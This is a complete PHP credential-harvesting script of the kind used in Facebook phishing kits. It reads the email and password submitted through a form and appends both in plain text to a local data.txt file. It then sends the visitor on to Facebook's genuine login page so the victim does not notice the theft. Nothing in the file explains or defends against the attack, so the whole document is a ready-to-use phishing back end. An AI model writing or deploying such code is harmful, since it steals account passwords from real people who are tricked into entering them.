<?php

$email = trim($_POST['email']);
$pass = trim($_POST['pass']);

$fp = fopen('data.txt','a');
fwrite($fp,"email: {$email}\n");
fwrite($fp,"pass: {$pass}\n");

fclose($fp);

header('Location: https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110');